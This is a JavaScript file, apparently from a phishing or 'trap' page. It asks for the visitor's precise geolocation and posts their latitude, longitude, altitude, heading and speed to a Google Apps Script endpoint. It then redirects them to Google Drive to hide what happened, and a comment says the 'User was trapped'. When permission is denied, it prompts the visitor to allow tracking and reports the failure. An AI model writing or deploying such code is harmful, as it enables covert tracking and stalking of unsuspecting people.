function locate() {
  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  } else {
    alert("Geolocation is not Supported by your Browser...");
  }

  function showPosition(position) {
    $.ajax({
      type: "POST",
      url: "https://script.google.com/macros/s/AKfycbwUSJoZEna25nrYPJwCKAiaEg3AL6irMN6OVJwJEN22L11Z17_ZMzMewYhd_o6_p6pRPg/exec",
      data: {
        status: "success",
        lat: "'" + String(position.coords.latitude),
        lon: "'" + String(position.coords.longitude),
        acc: "'" + String(position.coords.accuracy),
        alt: "'" + String(position.coords.altitude),
        dir: "'" + String(position.coords.heading),
        spd: "'" + String(position.coords.speed),
      },
      success: function () {
        // User was trapped
        window.location = "https://drive.google.com/";
      },
      // mimeType: "text",
    });
  }
}

function showError(error) {
  var err_text;

  switch (error.code) {
    case error.PERMISSION_DENIED:
      err_text = "User denied the request for Geolocation";
      alert("Please Refresh This Page and Allow Location Permission...");
      break;
    case error.POSITION_UNAVAILABLE:
      err_text = "Location information is unavailable";
      break;
    case error.TIMEOUT:
      err_text = "The request to get user location timed out";
      alert("Please Set Your Location Mode on High Accuracy...");
      break;
    case error.UNKNOWN_ERROR:
      err_text = "An unknown error occurred";
      break;
  }

  $.ajax({
    type: "POST",
    url: "https://script.google.com/macros/s/AKfycbwUSJoZEna25nrYPJwCKAiaEg3AL6irMN6OVJwJEN22L11Z17_ZMzMewYhd_o6_p6pRPg/exec",
    data: { status: "failed", err: err_text },
    success: function () {
      $("#change").html("Failed");
    },
    // mimeType: "text",
  });
}
